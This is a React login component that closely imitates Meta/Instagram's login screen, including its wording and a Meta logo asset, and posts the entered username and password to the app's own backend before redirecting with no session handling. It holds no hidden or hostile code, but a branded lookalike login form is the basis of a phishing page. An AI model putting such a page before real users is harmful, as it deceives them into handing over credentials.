import { useState } from "react";
import { useNavigate, Link } from "react-router-dom";
import api from "../api/axios";
import logo from "../assets/icons/images (1).jpeg";
import brand from "../assets/icons/Meta-Logo.avif";

export default function Login() {
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");

    if (!identifier || !password) {
      setError("Please fill in both fields.");
      return;
    }

    setLoading(true);
    try {
      const res = await api.post("/auth/login", { identifier, password });
      // Simple flow: no JWT/session, just redirect to the home page.
      navigate("/home", { state: { user: res.data.user } });
    } catch (err) {
      setError(err.response?.data?.message || "Login failed. Try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="screen">
      <div className="lang-select">English (UK)</div>

      <div className="app-icon">
        <img src={logo} alt="App logo placeholder" />
      </div>

      <form style={{ width: "100%" }} onSubmit={handleSubmit} noValidate>
        <input
          className="field"
          type="text"
          placeholder="Username, email address or mobile number"
          value={identifier}
          onChange={(e) => setIdentifier(e.target.value)}
        />
        <input
          className="field"
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <div className="error-msg">{error}</div>
        <button className="primary-btn" type="submit" disabled={loading}>
          {loading ? <span className="spinner"></span> : "Log in"}
        </button>
      </form>

      <button className="link-text" type="button">
        Forgotten password?
      </button>

      <div className="spacer"></div>

      <Link to="/register" style={{ width: "100%", textDecoration: "none" }}>
        <button className="secondary-btn" type="button">
          Create new account
        </button>
      </Link>

      <div className="brand-footer">
        <img src={brand} alt="Brand placeholder" />
      </div>
    </div>
  );
}
